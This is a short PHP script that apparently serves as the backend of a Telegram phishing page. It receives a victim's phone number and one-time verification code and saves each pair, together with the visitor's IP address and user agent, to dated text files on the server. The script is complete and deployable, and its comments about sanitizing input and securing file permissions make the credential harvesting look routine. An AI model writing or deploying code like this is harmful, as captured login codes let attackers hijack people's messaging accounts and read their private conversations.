<?php
// Create data directory if it doesn't exist
$dataDir = __DIR__ . '/telegram_data';
if (!file_exists($dataDir)) {
    mkdir($dataDir, 0755, true);
}

// Get the current date for folder structure
$dateFolder = date('Y-m-d');
$fullPath = "$dataDir/$dateFolder";

// Create date-specific subfolder
if (!file_exists($fullPath)) {
    mkdir($fullPath, 0755, true);
}

// Sanitize and validate input
$phone = filter_input(INPUT_POST, 'phone', FILTER_SANITIZE_STRING);
$code = filter_input(INPUT_POST, 'code', FILTER_SANITIZE_STRING);

if (empty($phone) || empty($code)) {
    die(json_encode(['success' => false, 'message' => 'Phone number and code are required']));
}

// Prepare data to save
$timestamp = date('Y-m-d H:i:s');
$ipAddress = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

$data = <<<EOD
Phone Number: $phone
Verification Code: $code
Timestamp: $timestamp
IP Address: $ipAddress
User Agent: $userAgent

EOD;

// Generate filename
$filename = "telegram_" . date('Ymd_His') . "_" . substr(md5($phone), 0, 8) . ".txt";
$filepath = "$fullPath/$filename";

// Save to file
if (file_put_contents($filepath, $data) !== false) {
    // Additional security: restrict file permissions
    chmod($filepath, 0600);
    echo json_encode(['success' => true, 'message' => 'Data saved successfully', 'path' => $filepath]);
} else {
    echo json_encode(['success' => false, 'message' => 'Failed to save data']);
}
?>